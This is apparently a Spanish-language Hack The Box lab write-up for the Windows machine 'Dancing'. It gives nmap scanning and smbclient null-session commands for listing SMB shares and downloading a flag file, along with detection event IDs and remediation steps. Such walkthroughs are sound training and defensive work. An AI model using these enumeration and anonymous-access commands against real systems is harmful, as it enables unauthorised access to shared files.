---
tags:
  - htb
  - starting-point
  - tier-0
  - easy
  - windows
  - smb
  - terminada
ip: 10.129.42.155
os: Windows
difficulty: Easy
status: terminada
tiempo: ~30m
fecha_inicio: 2026-06-11
fecha_completada: 2026-06-13
puntos: 0
mitre_tactics:
  - Lateral Movement
  - Discovery
mitre_techniques:
  - T1021.002
  - T1083
---

# 🖥️ Dancing — Windows — Easy (Tier 0)

> [!info] Resumen
> **IP:** `10.129.42.155` | **OS:** Windows | **Tier/Fase:** 0 | **Tiempo:** ~30m
> Máquina Windows con SMB expuesto. Share `WorkShares` accesible sin credenciales (null session). La flag está en un subdirectorio del share.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.42.155 -oN nmap.txt
```

| Puerto          | Servicio     | Versión | Hallazgo clave                        |
| --------------- | ------------ | ------- | ------------------------------------- |
| 135/TCP         | msrpc        | —       | Microsoft Windows RPC                 |
| 139/TCP         | netbios-ssn  | —       | Microsoft Windows NetBIOS             |
| 445/TCP         | microsoft-ds | —       | SMB — vector principal                |
| 5985/TCP        | http         | 2.0     | Microsoft HTTPAPI (WinRM)             |
| 47001/TCP       | http         | —       | Microsoft HTTPAPI (SSDP/UPnP)         |
| 49664-49669/TCP | msrpc        | —       | Microsoft Windows RPC (puertos altos) |

```
smb2-security-mode:
  Message signing enabled but not required  ← signing no forzado = misconfiguration
clock-skew: 4h00m00s
```

**→ Vector:** Puerto 445 abierto. SMB signing no obligatorio. Enumerar shares buscando acceso anónimo.

---

## 2. Explotación

> Vector principal: SMB Null Session — share `WorkShares` sin autenticación

```bash
# Paso 1: enumerar shares sin credenciales (-N = no password)
smbclient -L 10.129.42.155 -N

#        Sharename       Type      Comment
#        ---------       ----      -------
#        ADMIN$          Disk      Remote Admin
#        C$              Disk      Default share
#        IPC$            IPC       Remote IPC
#        WorkShares      Disk

# Paso 2: conectar al share accesible
smbclient //10.129.42.155/WorkShares -N

# Paso 3: dentro de smbclient — navegar y extraer la flag
smb: \> ls
  Amy.J                               D        0
  James.P                             D        0

smb: \James.P\> ls
  flag.txt                            A       32

smb: \James.P\> get flag.txt
# Descarga flag.txt a tu directorio local en la máquina atacante

# Paso 4: leer la flag desde el shell local
smb: \James.P\> !cat flag.txt
```

> [!warning] Diferencia clave: comandos locales vs remotos en smbclient
> - `ls`, `cd`, `get` → operan sobre el **share remoto**
> - `!comando` → shell escape, ejecuta en tu **máquina local**
> - `!cat flag.txt` después de `get` lee el archivo descargado localmente — no ejecuta nada en el target
> - `IPC$` es un pipe especial para RPC, no tiene archivos listables (`ls` devuelve `NT_STATUS_NO_SUCH_FILE`)

> [!success] Flag obtenida
> `035db21c881520061c53e0536e44f815`

---

## 3. Escalación de Privilegios *(no aplica)*

Tier 0 — acceso directo a la flag vía share público.

---

## 4. MITRE ATT&CK

| Táctica          | Técnica                           | ID        | Uso en esta máquina                                              |
| ---------------- | --------------------------------- | --------- | ---------------------------------------------------------------- |
| Lateral Movement | Remote Services: SMB/Admin Shares | T1021.002 | Conexión anónima (null session) al share `WorkShares`            |
| Discovery        | File and Directory Discovery      | T1083     | `ls` + navegación por subdirectorios del share para hallar flag  |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Event ID 4624 (Logon Type 3, cuenta `Anonymous Logon`) — logon de red sin credenciales al host Windows
- Sysmon Event ID 3 — conexión entrante al puerto 445 desde IP externa
- Event ID 4663 — acceso a objeto de archivo (si Audit Object Access está habilitado en el share)

**Remediación:**
- Deshabilitar null sessions: `HKLM\SYSTEM\CurrentControlSet\Control\LSA → RestrictAnonymous = 2`
- Restringir permisos del share: `WorkShares` no debe ser legible por `Everyone` ni `Anonymous Logon`
- Forzar SMB Signing: previene relay attacks (en esta máquina signing era no-obligatorio)

---

## 6. Lecciones

- **SMB null session:** shares Windows accesibles sin credenciales si los permisos no están restringidos. Siempre probar `-N` en cada share de la lista.
- **smbclient shell escape:** `!comando` ejecuta en tu máquina local, no en el target. `ls`/`cd`/`get` operan en el share remoto. Confundirlos bloquea el avance.
- **IPC$ no tiene archivos:** es un share especial para pipes con nombre (RPC). Nunca tiene archivos listables — si ves `NT_STATUS_NO_SUCH_FILE`, estás en el share equivocado.

**Bloqueado durante la máquina:**

| Fase        | Causa                                         | Fix                                                             |
| ----------- | --------------------------------------------- | --------------------------------------------------------------- |
| Explotación | Conectado a IPC$ en lugar de WorkShares       | Probar cada share de la lista con `-N` antes de descartar       |
| Explotación | Confusión entre `ls` (remoto) y `!ls` (local) | Revisar comandos de smbclient: ls=remoto, !cmd=local            |

---

## 7. Conexiones

- Similar: `[[HTB/Meow/Meow]]` — credenciales por defecto en servicio expuesto
- Siguiente nivel: `[[HTB/Tactics/Tactics]]` — SMB + PsExec (Tier 1)
- Técnica: `[[Técnicas/SMB_Null_Session]]`

**Referencias:** [HackTricks SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb) · [MITRE T1021.002](https://attack.mitre.org/techniques/T1021/002/)
